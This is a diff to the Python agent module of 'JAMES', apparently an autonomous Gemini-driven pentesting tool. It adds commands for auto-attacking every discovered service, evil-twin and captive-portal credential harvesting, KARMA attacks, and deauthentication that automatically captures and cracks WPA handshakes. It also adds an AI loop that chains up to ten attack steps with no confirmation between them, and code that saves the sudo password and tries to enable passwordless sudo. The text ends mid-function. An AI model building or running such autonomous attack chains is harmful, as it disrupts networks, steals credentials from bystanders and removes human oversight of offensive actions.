@@ -19,12 +19,7 @@ from typing import Optional
 
 logger = logging.getLogger(__name__)
 
-try:
-    from google import genai
-    from google.genai import types
-    HAS_GENAI = True
-except ImportError:
-    HAS_GENAI = False
+from james.core.ai_engine import GeminiEngine, ActionParams
 
 from james.core.orchestrator import Orchestrator
 
@@ -77,6 +72,10 @@ INTENT_PATTERNS = [
     (r"(?:ble\s*scan|bluetooth\s*scan|bt\s*scan)(?:\s+(\S+))?", "ble_scan"),
     (r"(?:mqtt\s*scan|mqtt\s*probe|mqtt\s*enum)\s+(\S+)", "mqtt_scan"),
 
+    # Compound auto-attack commands (must be before generic scan/recon catch-all)
+    (r"(?:scan\s*(?:and|&)\s*attack|recon\s*(?:and|&)\s*attack|auto\s*recon)\s+(\S+)", "scan_and_attack"),
+    (r"(?:auto\s*attack|attack\s*all|attack\s*services|auto\s*exploit)(?:\s+(\S+))?", "auto_attack_services"),
+
     # Generic recon catch-all (MUST be last in this section)
     (r"(?:scan|recon|enumerate|discover)\s+(.+)", "recon"),
 
@@ -86,13 +85,23 @@ INTENT_PATTERNS = [
     (r"(?:disable|stop|turn\s*off)\s+monitor(?:\s+(?:mode\s+)?(?:on\s+)?(\S+))?", "monitor_off"),
     (r"deauth(?:enticate)?\s+(\S+)(?:\s+(\d+))?", "deauth"),
     (r"(?:capture|sniff)\s+(?:handshake|packets?)\s+(?:on\s+)?(\S+)", "capture"),
-    (r"(?:auto\s*pwn|autopwn|auto\s*hack|auto\s*crack)(?:\s+(\S+))?", "autopwn"),
+    (r"(?:auto\s*pwn|autopwn|auto\s*hack|auto\s*crack|autopilot|go\s*autonomous|wifi\s*autopilot)(?:\s+(\S+))?", "autopwn"),
+    (r"(?:install\s*(?:deps|dependencies|tools|packages)|auto\s*install|setup\s*tools|check\s*deps)", "install_deps"),
 
     # One-Click Hacks
     (r"(?:wifi\s*blitz|blitz\s*wifi|wifi\s*nuke)(?:\s+(\S+))?", "oneclick_wifi_blitz"),
     (r"(?:network\s*dominate|dominate|net\s*dominate|net\s*pwn)\s+(\S+)", "oneclick_network_dominate"),
     (r"(?:web\s*pwn|web\s*hack|web\s*nuke)\s+(\S+)", "oneclick_web_pwn"),
     (r"(?:evil\s*twin|rogue\s*ap)(?:\s+(\S+))?", "oneclick_evil_twin"),
+    (r"(?:stop\s*pineapple|stop\s*portal|stop\s*karma|pineap\s*stop)", "stop_pineapple"),
+    (r"(?:pineapple|pineap|wifi\s*pineapple|start\s*pineapple)(?:\s+(\S+))?", "pineapple_campaign"),
+    (r"(?:evil\s*portal|captive\s*portal|fake\s*portal)(?:\s+(\S+))?", "evil_portal"),
+    (r"(?:karma|karma\s*attack|karma\s*mode)(?:\s+(\S+))?", "karma_attack"),
+    (r"(?:harvest\s*probes?|probe\s*harvest|probe\s*requests?)(?:\s+(\S+))?", "harvest_probes"),
+    (r"(?:track\s*clients?|show\s*clients?|connected\s*clients?|client\s*track)", "track_clients"),
+    (r"(?:snoop\s*dns|dns\s*snoop|dns\s*log|show\s*dns)", "snoop_dns"),
+    (r"(?:spoof\s*mac|mac\s*spoof|randomize?\s*mac|mac\s*change)(?:\s+(\S+))?(?:\s+(\S+))?", "spoof_mac"),
+    (r"(?:show\s*creds|harvested?\s*creds?|captured?\s*creds?|portal\s*creds?)", "show_portal_creds"),
     (r"(?:(?:connect|find|get|join|grab)\s*(?:to\s*)?(?:an?\s*)?(?:open\s*|free\s*)?(?:wifi|wi-fi|wireless|network|internet|hotspot|ap)|(?:need|want|gimme)\s*(?:some\s*)?(?:wifi|wi-fi|internet|network))", "connect_open_wifi"),
 
     # OSINT
@@ -124,6 +133,7 @@ INTENT_PATTERNS = [
     (r"(?:system\s*check|check\s*tools?|status)", "system_check"),
     (r"(?:list|show)\s+skills?", "list_skills"),
     (r"(?:list|show)\s+(?:wordlists?|word\s*lists?|dicts?|dictionaries)", "list_wordlists"),
+    (r"(?:generate|create|build|make)\s+(?:wordlists?|word\s*lists?)(?:\s+(.+))?", "generate_wordlists"),
     (r"(?:show|list|get)\s+primers?(?:\s+(\w+))?", "show_primer"),
     (r"(?:net\s*guard|network\s*guard|connection\s*status|self.?protect)", "net_guard_status"),
     (r"(?:run|execute|load)\s+skill\s+(\S+)", "run_skill"),
@@ -159,8 +169,9 @@ class Agent:
     # Keys that should persist across restarts
     _PERSIST_KEYS = {
         "target", "interface", "wordlist", "domain", "lhost", "lport",
-        "gateway", "username", "target_url", "target_bssid",
+        "gateway", "username", "target_url", "target_bssid", "target_ssid",
         "discovered_services", "scan_history", "victim",
+        "monitor_interface", "cracked_keys", "loot_cache",
     }
 
     # Pronouns / shorthand that reference last target
@@ -177,10 +188,7 @@ class Agent:
         self.context: dict = self._load_context()
         self.history: list[dict] = []
         self.last_intent: str = "default"
-        self.genai_client = None
-        
-        if HAS_GENAI and os.environ.get("GEMINI_API_KEY"):
-            self.genai_client = genai.Client()
+        self.ai = GeminiEngine()
 
     def _load_context(self) -> dict:
         """Load persisted context from disk."""
@@ -207,6 +215,12 @@ class Agent:
         """
         Main entry point. Takes user text, returns agent response.
         May execute tools as a side effect.
+
+        Dispatch priority:
+          1. Gemini function calling (structured tool use)
+          2. Regex pattern matching (fast, deterministic)
+          3. LLM conversational fallback (advice, explanations)
+          4. Fuzzy suggestion fallback (offline)
         """
         text = user_input.strip()
         if not text:
@@ -217,21 +231,44 @@ class Agent:
 
         self.history.append({"role": "user", "content": text})
 
-        # Try LLM first
-        if self.genai_client:
-            resp = self._process_with_llm(text)
-            if resp is not None:
+        # ── 1. Try Gemini function calling ──────────────────────
+        ai_result = self.ai.process(text, self.context)
+        if ai_result is not None:
+            if ai_result["type"] == "function_call":
+                action = ai_result["action"]
+                params = ai_result["params"]
+
+                # Check if this looks like a multi-step goal that
+                # should be chained rather than single-shot
+                if self._is_chain_request(text):
+                    resp = self._run_chain(text)
+                    if resp:
+                        self.last_intent = "chain"
+                        self.history.append({"role": "agent", "content": resp})
+                        self._save_context()
+                        return resp
+
+                # Single-action dispatch
+                self.last_intent = action
+                resp = self._dispatch(action, params, text)
+                self.history.append({"role": "agent", "content": resp})
+                self._save_context()
+                return resp
+            elif ai_result["type"] == "chat":
+                resp = ai_result["message"]
+                self.last_intent = "chat"
                 self.history.append({"role": "agent", "content": resp})
                 return resp
 
-        # Fallback to Regex
+        # ── 2. Regex pattern matching ───────────────────────────
         intent, match = self._match_intent(text)
-        if intent is None:
-            self.last_intent = "default"
-            resp = self._fallback(text)
-        else:
+        if intent is not None:
             self.last_intent = intent
             resp = self._dispatch(intent, match, text)
+        else:
+            # ── 3. LLM conversational fallback ──────────────────
+            self.last_intent = "default"
+            resp = self._fallback(text)
 
         self.history.append({"role": "agent", "content": resp})
         # Prevent unbounded growth — keep last MAX_HISTORY entries
@@ -240,6 +277,63 @@ class Agent:
         # Persist context after every command
         self._save_context()
         return resp
+
+    # ── multi-step chain detection ───────────────────────────────
+
+    # Phrases that signal "do multiple things"
+    _CHAIN_SIGNALS = re.compile(
+        r"(?:"
+        r"and\s+then|and\s+also|and\s+next|and\s+after"
+        r"|then\s+(?:try|run|do|crack|brute|scan)"
+        r"|find.+(?:and|then)\s+\w+"
+        r"|scan.+(?:and|then)\s+\w+"
+        r"|crack\s+(?:any|all|every)"
+        r"|full\s+(?:pentest|audit|assessment)"
+        r"|do\s+everything"
+        r"|start\s+to\s+finish|end\s+to\s+end"
+        r"|automate"
+        r")",
+        re.IGNORECASE,
+    )
+
+    def _is_chain_request(self, text: str) -> bool:
+        """Detect if user input looks like a multi-step goal."""
+        return bool(self._CHAIN_SIGNALS.search(text))
+
+    def _run_chain(self, goal: str) -> Optional[str]:
+        """
+        Execute a multi-step AI-driven workflow.
+
+        The AI autonomously chains tools: execute one → observe result →
+        decide next → repeat until the goal is met.
+
+        Runs synchronously (the caller already handles threading for
+        long-running operations). Each step prints live to the dashboard.
+        """
+        def execute_fn(action, params):
+            return self._dispatch(action, params, goal)
+
+        def on_step(step, action, summary):
+            self.orch._print(f"  🔗 Step {step}: {action}")
+
+        self.orch._print(f"\n{'━' * 50}")
+        self.orch._print(f"🧠 AI Chain — {goal}")
+        self.orch._print(f"{'━' * 50}")
+
+        result = self.ai.run_chain(
+            goal,
+            self.context,
+            execute_fn,
+            max_steps=10,
+            on_step=on_step,
+        )
+
+        if result:
+            self.orch._print(f"\n{'━' * 50}")
+            self.orch._print("✅ Chain complete")
+            self.orch._print(f"{'━' * 50}")
+
+        return result
 
     def _resolve_pronouns(self, text: str) -> str:
         """Replace pronouns like 'it', 'that', 'deeper' with the actual target."""
@@ -272,196 +366,8 @@ class Agent:
 
         return text
 
-    def _process_with_llm(self, text: str) -> Optional[str]:
-        try:
-            system_prompt = """You are JAMES, an autonomous pentesting agent running on Parrot OS.
-You control various pentesting tools. Map the user's natural language to the correct JSON action.
-Be aggressive and thorough — always pick the most relevant attack tool.
-Available Actions:
-- {"action": "quick_recon", "target": "<IP/Domain>"} -> Fast nmap scan
-- {"action": "full_scan", "target": "<IP/Domain>"} -> Deep nmap scan  
-- {"action": "os_detect", "target": "<IP>"} -> OS fingerprinting
-- {"action": "arp_discover"} -> LAN host discovery via ARP
-- {"action": "list_interfaces"} -> List Wi-Fi interfaces
-- {"action": "monitor_on", "iface": "<interface>"} -> Start monitor mode
-- {"action": "monitor_off", "iface": "<interface>"} -> Stop monitor mode
-- {"action": "deauth", "bssid": "<mac>", "count": <int>} -> Send deauth frames
-- {"action": "nikto_scan", "target": "<URL>"} -> Web vulnerability scan
-- {"action": "dir_brute", "target": "<URL>"} -> Directory brute-force
-- {"action": "sqli_scan", "target": "<URL>"} -> SQL injection test
-- {"action": "smb_enum", "target": "<IP>"} -> SMB shares/users enumeration
-- {"action": "dns_lookup", "domain": "<domain>", "type": "ANY"} -> DNS resolution
-- {"action": "brute", "target": "<IP>", "service": "ssh"} -> Network brute-force (ssh/ftp/smb/rdp)
-- {"action": "web_pwn", "target": "<URL>"} -> Full web attack chain
-- {"action": "stealth_recon", "target": "<domain>"} -> Passive OSINT chain
-- {"action": "network_dominate", "target": "<IP/CIDR>"} -> Full network attack
-- {"action": "crack_wpa", "file": "<capture_file>", "wordlist": "<path>"} -> Crack WPA
-- {"action": "crack_hash", "file": "<hash_file>", "wordlist": "<path>"} -> Crack hash
-- {"action": "autopwn", "iface": "<interface>"} -> Fully autonomous Wi-Fi audit
-- {"action": "run_skill", "name": "<skill_name>"} -> Run automated skill workflow
-- {"action": "set_context", "key": "<key>", "value": "<value>"} -> Set context variable
-- {"action": "chat", "message": "<text>"} -> Respond conversationally if no tool is needed
 
-Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
-"""
-            # Inject current context so LLM knows what's active
-            ctx_info = ""
-            if self.context.get("target"):
-                ctx_info += f"Current target: {self.context['target']}\n"
-            if self.context.get("interface"):
-                ctx_info += f"Active interface: {self.context['interface']}\n"
-            svcs = self.context.get("discovered_services", {})
-            if svcs:
-                for tgt, info in list(svcs.items())[:3]:
-                    ctx_info += f"Known services on {tgt}: {', '.join(info.get('services', []))}\n"
 
-            # Build conversation history for LLM context
-            contents = ""
-            if ctx_info:
-                contents += f"[System Context]\n{ctx_info}\n"
-            for msg in self.history[-10:]:
-                role = "User" if msg["role"] == "user" else "Agent"
-                contents += f"{role}: {msg['content']}\\n"
-            
-            response = self.genai_client.models.generate_content(
-                model='gemini-2.5-pro',
-                contents=contents,
-                config=types.GenerateContentConfig(
-                    system_instruction=system_prompt,
-                    temperature=0.0,
-                    response_mime_type="application/json",
-                )
-            )
-            
-            data = json.loads(response.text)
-            action = data.get("action")
-            self.last_intent = action or "default"
-            
-            if action == "chat":
-                return data.get("message", "...")
-            elif action == "quick_recon":
-                target = data.get("target")
-                self.context["target"] = target
-                return self._format_scan(self.orch.quick_recon(target), target, "Quick")
-            elif action == "full_scan":
-                target = data.get("target")
-                self.context["target"] = target
-                return self._format_scan(self.orch.full_scan(target), target, "Full")
-            elif action == "os_detect":
-                class MockMatch:
-                    def group(self, i): return data.get("target")
-                return self._do_os_detect(MockMatch(), None)
-            elif action == "list_interfaces":
-                return self._do_list_interfaces(None, None)
-            elif action == "monitor_on":
-                class MockMatch:
-                    def group(self, i): return data.get("iface")
-                return self._do_monitor_on(MockMatch(), None)
-            elif action == "monitor_off":
-                class MockMatch:
-                    def group(self, i): return data.get("iface")
-                return self._do_monitor_off(MockMatch(), None)
-            elif action == "deauth":
-                class MockMatch:
-                    def group(self, i): 
-                        if i==1: return data.get("bssid")
-                        if i==2: return str(data.get("count", 10))
-                        return None
-                return self._do_deauth(MockMatch(), None)
-            elif action == "crack_wpa":
-                class MockMatch:
-                    def group(self, i): 
-                        if i==1: return data.get("file")
-                        if i==2: return data.get("wordlist")
-                        return None
-                return self._do_crack_wpa(MockMatch(), None)
-            elif action == "crack_hash":
-                class MockMatch:
-                    def group(self, i): 
-                        if i==1: return data.get("file")
-                        if i==2: return data.get("wordlist")
-                        return None
-                return self._do_crack_hash(MockMatch(), None)
-            elif action == "run_skill":
-                class MockMatch:
-                    def group(self, i): return data.get("name")
-                return self._do_run_skill(MockMatch(), None)
-            elif action == "autopwn":
-                class MockMatch:
-                    def group(self, i): return data.get("iface")
-                return self._do_autopwn(MockMatch(), None)
-            elif action == "set_context":
-                key = data.get("key")
-                val = data.get("value")
-                self.context[key] = val
-                return f"✅ Context updated (via AI): {key} = {val}"
-            # ── New tool actions ────────────────────────────────
-            elif action == "arp_discover":
-                return self._do_arp_discover(re.match(r"(.*)", ""), None)
-            elif action == "nikto_scan":
-                target = data.get("target", "")
-                self.context["target"] = target
-                result = self.orch.nikto_scan(target)
-                vulns = result.get("vulnerabilities", [])
-                lines = [f"🌐 Nikto Scan — {target}", f"{len(vulns)} finding(s)", ""]
-                for v in vulns[:20]:
-                    lines.append(f"  ⚠ {v}")
-                return "\n".join(lines)
-            elif action == "dir_brute":
-                target = data.get("target", "")
-                self.context["target_url"] = target
-                result = self.orch.dir_bust(target)
-                if result.get("findings"):
-                    lines = [f"📂 Dir Bust — {target}", f"Found {result['total']} path(s)", ""]
-                    for f in result["findings"][:20]:
-                        lines.append(f"  [{f['status']}] {f['path']}  ({f['size']}B)")
-                    return "\n".join(lines)
-                return f"📂 Dir Bust — {target}\n\nNo paths found."
-            elif action == "sqli_scan":
-                target = data.get("target", "")
-                result = self.orch.sqli_scan(target)
-                if result.get("injectable"):
-                    return f"💉 INJECTABLE! {result['vuln_count']} vuln(s) on {target}"
-                return f"💉 SQLMap — {target} — not injectable."
-            elif action == "smb_enum":
-                target = data.get("target", "")
-                self.context["target"] = target
-                result = self.orch.smb_enum(target)
-                lines = [f"📂 SMB — {target}", f"{result.get('share_count', 0)} share(s), {result.get('user_count', 0)} user(s)"]
-                for s in result.get("shares", []):
-                    lines.append(f"  📂 {s['name']} ({s['type']})")
-                return "\n".join(lines)
-            elif action == "dns_lookup":
-                domain = data.get("domain", "")
-                rtype = data.get("type", "ANY")
-                result = self.orch.dns_lookup(domain, record_type=rtype)
-                records = result.get("records", [])
-                lines = [f"🔎 DNS — {domain} ({rtype})", f"{len(records)} record(s)"]
-                for r in records[:15]:
-                    lines.append(f"  → {r}")
-                return "\n".join(lines)
-            elif action == "brute":
-                target = data.get("target", "")
-                service = data.get("service", "ssh")
-                self.context["target"] = target
-                result = self.orch.brute_service(target, service)
-                if result.get("found"):
-                    creds = result["credentials"]
-                    return f"🔑 CRACKED! {target} ({service}): {creds[0]['login']}:{creds[0]['password']}"
-                return f"🔒 No creds found for {target} ({service})"
-            elif action in ("web_pwn", "stealth_recon", "network_dominate"):
-                # Route these through the regex handler for the one-click hacks
-                class MockMatch:
-                    def group(self, i): return data.get("target")
-                handler = getattr(self, f"_do_oneclick_{action}", None)
-                if handler:
-                    return handler(MockMatch(), None)
-                return None
-            else:
-                return None  # Let regex handle unknown actions
-        except Exception as e:
-            logging.error(f"LLM Error: {e}")
-            return None
 
     # ── intent matching ─────────────────────────────────────────
 
@@ -502,8 +408,9 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
     list interfaces        Show wireless adapters
     enable monitor [iface] Start monitor mode
     disable monitor [iface] Stop monitor mode
-    deauth <BSSID> [count] Send deauth frames
-    autopwn [interface]    Full autonomous Wi-Fi crack
+    deauth <BSSID> [count] Send deauth → auto-capture → auto-crack
+    autopilot [interface]  Full autonomous: scan → PMKID → deauth → crack
+    autopwn [interface]    Same as autopilot
 
   🌐 Web & OSINT
     osint <domain>         Harvest emails, subdomains, IPs
@@ -527,11 +434,12 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
     msf [search term]      Metasploit search/exploit
 
   🔓 Cracking
-    crack wpa <file>       Crack WPA handshake
+    crack wpa <file>       Crack WPA handshake (6-stage pipeline)
     crack hash <file>      Crack hash file (hashcat)
 
   ⚙️ System
     status                 Check all {skill_count}+ tools
+    install deps           Auto-install missing tools
     list skills            Show {skill_count} skill workflows
     run skill <name>       Execute a skill workflow
     report                 Generate session report
@@ -549,12 +457,30 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
     stealth recon <target> OSINT → DNS → WHOIS → Scan (passive)
     evil twin [iface]      Rogue AP clone + credential capture
 
+  🍍 WiFi Pineapple
+    pineapple [iface]      Full Pineapple campaign (scan→portal→harvest)
+    evil portal [iface]    Launch captive portal credential harvester
+    karma [iface]          KARMA attack — respond to all probe requests
+    harvest probes [iface] Passive probe request collection
+    track clients          Show clients connected to rogue AP
+    snoop dns              Show DNS queries from connected clients
+    spoof mac <iface>      Randomize MAC address
+    show creds             Show captured portal credentials
+    stop pineapple         Stop all PineAP services
+
+  🤖 Compound Auto-Attack
+    scan and attack <target> Full scan → auto-attack all services
+    auto attack [target]   Attack all previously scanned services
+    deauth <BSSID>         Deauth → auto-capture → auto-crack
+
   💻 Shell
     ! <command>            Run a raw shell command
 
   📚 Wordlists
     list wordlists         Show all available wordlists by category
     set wordlist <path>    Set active wordlist for cracking
+    generate wordlists     Create Wi-Fi optimized wordlists
+    generate wordlists <SSID> Create SSID-targeted wordlist
 
   🧠 AI Primers
     show primers           List all AI phase primers
@@ -604,14 +530,32 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
         self.context["target"] = target
         result = self.orch.quick_recon(target)
         self._remember_services(target, result)
-        return self._format_scan(result, target, "Quick")
+        output = self._format_scan(result, target, "Quick")
+
+        # Auto-chain: offer auto-attack if juicy services found
+        hosts = result.get("hosts", [])
+        attackable = self._count_attackable_services(hosts)
+        if attackable > 0:
+            output += f"\n\n  🔥 {attackable} attackable service(s) detected."
+            output += f"\n     Type 'network dominate {target}' for full auto-attack chain."
+
+        return output
 
     def _do_full_scan(self, m, raw) -> str:
         target = m.group(1).strip()
         self.context["target"] = target
         result = self.orch.full_scan(target)
         self._remember_services(target, result)
-        return self._format_scan(result, target, "Full")
+        output = self._format_scan(result, target, "Full")
+
+        # Auto-chain: offer auto-attack if juicy services found
+        hosts = result.get("hosts", [])
+        attackable = self._count_attackable_services(hosts)
+        if attackable > 0:
+            output += f"\n\n  🔥 {attackable} attackable service(s) detected."
+            output += f"\n     Type 'network dominate {target}' for full auto-attack chain."
+
+        return output
 
     def _do_os_detect(self, m, raw) -> str:
         target = m.group(1).strip()
@@ -649,7 +593,14 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
             mon_iface = f"{iface}mon" if not iface.endswith("mon") else iface
             self.context["monitor_interface"] = mon_iface
             return f"📡 Monitor mode enabled on {iface}\n    Monitor interface: {mon_iface}"
-        return f"[!] Failed to enable monitor mode:\n{result.get('stderr', '')}"
+        stderr = result.get('stderr', '')
+        if 'password is required' in stderr or 'sudo' in stderr.lower():
+            return ("🔐 Sudo password not configured!\n\n"
+                    "   Fix it now (one-time):\n"
+                    "     set sudo <your_linux_password>\n\n"
+                    "   Then retry:\n"
+                    f"     enable monitor {iface}")
+        return f"[!] Failed to enable monitor mode:\n{stderr}"
 
     def _do_monitor_off(self, m, raw) -> str:
         iface = m.group(1) or self.context.get("monitor_interface") or self.context.get("interface")
@@ -662,29 +613,97 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
     def _do_deauth(self, m, raw) -> str:
         bssid = m.group(1)
         count = int(m.group(2)) if m.group(2) else 10
-        iface = self.context.get("monitor_interface") or self.context.get("interface")
-        if not iface:
-            return "[!] No monitor interface active. Enable monitor mode first."
+
+        # Auto-resolve prerequisites
+        try:
+            iface = self.orch.ensure_wireless_interface(
+                self.context.get("monitor_interface") or self.context.get("interface", "")
+            )
+            mon_iface = self.orch.ensure_monitor_mode(iface)
+            self.context["interface"] = iface.replace("mon", "") if iface.endswith("mon") else iface
+            self.context["monitor_interface"] = mon_iface
+        except RuntimeError as e:
+            return f"[!] {e}"
+
         # Network self-protection
         safe, reason = self.orch.net_guard.check_deauth_safe(bssid)
         if not safe:
             return reason
         self.context["target_bssid"] = bssid
-        result = self.orch.aircrack.deauth(iface, bssid, count=count)
-        return f"💀 Sent {count} deauth frames → {bssid} via {iface}\n{result.stdout[:500]}"
+        result = self.orch.aircrack.deauth(mon_iface, bssid, count=count)
+        lines = [f"💀 Sent {count} deauth frames → {bssid} via {mon_iface}"]
+        lines.append(result.stdout[:300] if result.stdout else "")
+
+        # Auto-chain: capture handshake after deauth
+        lines.append("\n📡 Auto-capturing handshake (15s)...")
+        cap_prefix = "/tmp/james_deauth_cap"
+        self.orch.layer.run(f"rm -f {cap_prefix}*")
+        import time
+        proc = self.orch.aircrack.start_airodump(
+            mon_iface, bssid=bssid, write_prefix=cap_prefix
+        )
+        # Send more deauth bursts during capture
+        time.sleep(3)
+        self.orch.aircrack.deauth(mon_iface, bssid, count=5)
+        time.sleep(5)
+        self.orch.aircrack.deauth(mon_iface, bssid, count=5)
+        time.sleep(7)
+        self.orch.layer.kill_background(proc)
+
+        cap_file = f"{cap_prefix}-01.cap"
+        from pathlib import Path
+        if Path(cap_file).exists() and self.orch.aircrack.check_handshake(cap_file, bssid):
+            lines.append("✅ Handshake captured!")
+            self.context["capture_file"] = cap_file
+
+            # Auto-chain: start cracking in background
+            wordlist = self.orch.ensure_wordlist(
+                self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
+            )
+            lines.append(f"🔓 Auto-starting Smart WPA Crack in background...")
+            lines.append(f"   Wordlist: {wordlist}")
+            t = threading.Thread(
+                target=self.orch.crack_wpa_smart,
+                args=(cap_file, wordlist, bssid),
+                daemon=True
+            )
+            t.start()
+            lines.append("   Switch to ⚡ Dashboard to watch progress.")
+        else:
+            lines.append("⚠️ No handshake captured. Try again or get closer to the AP.")
+
+        return "\n".join(lines)
 
     def _do_crack_wpa(self, m, raw) -> str:
         cap_file = m.group(1)
-        wordlist = m.group(2) if m.group(2) else "/home/malcolm/Desktop/rockyou.txt"
+        wordlist = m.group(2) if m.group(2) else self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
         bssid = self.context.get("target_bssid")
+
+        # Auto-resolve prerequisites
+        try:
+            cap_file = self.orch.ensure_capture_file(cap_file)
+            wordlist = self.orch.ensure_wordlist(wordlist)
+        except RuntimeError as e:
+            return f"[!] {e}"
+
+        # Auto-check: skip if already cracked
+        if bssid:
+            cached = self.orch.get_cached_key(bssid)
+            if cached:
+                return f"🔑 Already cracked!\n\n    BSSID: {bssid}\n    Password: {cached}\n\n    💡 Check 'show loot' for all cached keys."
+
         result = self.orch.crack_handshake(cap_file, wordlist, bssid)
         if result.get("found"):
-            return f"🔑 KEY FOUND!\n\n    Password: {result['key']}\n    Capture:  {cap_file}"
-        return f"🔒 No key found in {cap_file} with the provided wordlist."
+            return f"🔑 KEY FOUND!\n\n    Password: {result['key']}\n    Capture:  {cap_file}\n\n    💡 Key saved to loot cache."
+        return f"🔒 No key found in {cap_file} with the provided wordlist.\n\n    💡 Try: crack smart {cap_file} — uses cascading engines (hashcat+rules → john)"
 
     def _do_crack_hash(self, m, raw) -> str:
         hash_file = m.group(1)
-        wordlist = m.group(2) if m.group(2) else "/home/malcolm/Desktop/rockyou.txt"
+        wordlist = m.group(2) if m.group(2) else self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
+
+        # Auto-resolve prerequisites
+        wordlist = self.orch.ensure_wordlist(wordlist)
+
         result = self.orch.crack_hash(hash_file, wordlist)
         if result.get("success"):
             return f"🔓 Hashcat finished:\n{result['output'][-800:]}"
@@ -741,8 +760,47 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
             lines.append("")
         total = sum(wl["lines"] for wl in inventory)
         lines.append(f"  Total: {total:,} entries across {len(inventory)} lists")
+
+        # Show JAMES generated wordlists if they exist
+        james_dir = Path.home() / ".james" / "wordlists"
+        if james_dir.exists():
+            james_files = list(james_dir.glob("*.txt"))
+            if james_files:
+                lines.append(f"\n  ── JAMES GENERATED {'─' * 27}")
+                for f in sorted(james_files):
+                    count = sum(1 for _ in open(f, errors="ignore"))
+                    size_kb = f.stat().st_size / 1024
+                    lines.append(f"    {f.name:<35} {count:>12,} entries  ({size_kb:.0f}KB)")
+
         lines.append(f"\n  💡 Set wordlist: set wordlist <path>")
+        lines.append(f"  💡 Generate Wi-Fi lists: generate wordlists [SSID]")
         return "\n".join(lines)
+
+    def _do_generate_wordlists(self, m, raw) -> str:
+        """Generate WiFi-optimized wordlists."""
+        ssid = m.group(1).strip() if m.lastindex and m.group(1) else ""
+
+        # Use SSID from context if not provided
+        if not ssid:
+            ssid = self.context.get("target_ssid", "")
+
+        def _generate():
+            self.orch.generate_wifi_wordlists(ssid)
+
+        t = threading.Thread(target=_generate, daemon=True)
+        t.start()
+
+        msg = "📝 Generating Wi-Fi wordlists in background...\n\n"
+        msg += "   Creating:\n"
+        msg += "     • wifi_common.txt   — Top Wi-Fi password patterns\n"
+        msg += "     • wifi_numeric.txt  — Numeric PINs & ISP defaults\n"
+        if ssid:
+            msg += f"     • ssid_{ssid}.txt — Targeted list for '{ssid}'\n"
+        msg += "     • wifi_ultimate.txt — Combined master list\n"
+        msg += "\n   📁 Output: ~/.james/wordlists/\n"
+        msg += "   💡 These are automatically used by 'crack smart' and 'wifi blitz'.\n"
+        msg += "\n   Switch to ⚡ Dashboard to watch progress."
+        return msg
 
     def _do_show_primer(self, m, raw) -> str:
         from james.core.primers import list_primers, get_primer, PRIMERS
@@ -789,6 +847,22 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
         key = m.group(1).strip()
         val = m.group(2).strip()
         self.context[key] = val
+
+        # Auto-configure sudo when password is set
+        if key in ("sudo", "sudo_password", "sudo_pass"):
+            self.orch.layer.set_sudo_password(val)
+            # Also save to settings and attempt NOPASSWD config
+            try:
+                from james.gui.setup_wizard import save_settings, load_settings, _auto_configure_nopasswd
+                settings = load_settings()
+                settings["sudo_password"] = val
+                save_settings(settings)
+                os.environ["JAMES_SUDO_PASS"] = val
+                _auto_configure_nopasswd(val)
+                return f"🔐 Sudo password configured & NOPASSWD setup attempted.\n   All privileged commands should now work."
+            except Exception:
+                return f"🔐 Sudo password set for this session.\n   Run install_deps.sh as root for permanent NOPASSWD."
+
         return f"✅ Context updated: {key} = {val}"
 
     def _do_run_skill(self, m, raw) -> str:
@@ -797,35 +871,77 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
         if "error" in skill:
             return f"[!] {skill['error']}"
         
-        # Check for required parameters
+        # Check for required parameters and auto-resolve common ones
         missing = []
+        auto_resolved = []
         for step in skill.get("steps", []):
             for param_key, param_val in step.get("params", {}).items():
                 if isinstance(param_val, str) and param_val.startswith("{{") and param_val.endswith("}}"):
                     var_name = param_val[2:-2].strip()
                     if var_name not in self.context:
+                        # Try to auto-resolve common variables
+                        if var_name in ("interface", "iface", "wifi_interface"):
+                            try:
+                                resolved = self.orch.ensure_wireless_interface("")
+                                self.context[var_name] = resolved
+                                auto_resolved.append(f"{var_name} → {resolved}")
+                                continue
+                            except RuntimeError:
+                                pass
+                        elif var_name in ("wordlist", "wordlist_path"):
+                            try:
+                                resolved = self.orch.ensure_wordlist("/home/malcolm/Desktop/rockyou.txt")
+                                self.context[var_name] = resolved
+                                auto_resolved.append(f"{var_name} → {resolved}")
+                                continue
+                            except RuntimeError:
+                                pass
+                        elif var_name == "target" and self.context.get("target"):
+                            continue  # already set
+                        elif var_name in ("lhost", "local_ip"):
+                            # Auto-detect local IP
+                            try:
+                                result = self.orch.layer.run("hostname -I | awk '{print $1}'", timeout=5)
+                                ip = result.stdout.strip()
+                                if ip:
+                                    self.context[var_name] = ip
+                                    auto_resolved.append(f"{var_name} → {ip}")
+                                    continue
+                            except Exception:
+                                pass
                         missing.append(var_name)
         
         if missing:
             missing = list(set(missing))
-            return (f"⚠️ Cannot start skill '{name}' because parameters are missing from context:\n"
-                    f"  {', '.join(missing)}\n\n"
-                    f"Please set them using: set <variable> <value>")
+            msg = f"⚠️ Cannot start skill '{name}' — missing context:\n  {', '.join(missing)}\n\n"
+            msg += "Please set them: set <variable> <value>"
+            if auto_resolved:
+                msg = f"✅ Auto-resolved: {', '.join(auto_resolved)}\n\n" + msg
+            return msg
         
         # Launch the workflow in a separate thread so we don't block the agent
+        resolved_msg = ""
+        if auto_resolved:
+            resolved_msg = f"\n   ✅ Auto-resolved: {', '.join(auto_resolved)}"
 
         t = threading.Thread(target=self._execute_skill_steps, args=(skill,), daemon=True)
         t.start()
         
-        return f"⚡ Starting automated skill: {skill['name']}\n\nSwitch to the ⚡ Dashboard tab to monitor progress in the terminal."
+        return f"⚡ Starting automated skill: {skill['name']}{resolved_msg}\n\nSwitch to the ⚡ Dashboard tab to monitor progress in the terminal."
 
     def _do_autopwn(self, m, raw) -> str:
-        iface = m.group(1) if m.group(1) else self.context.get("interface")
-        if not iface:
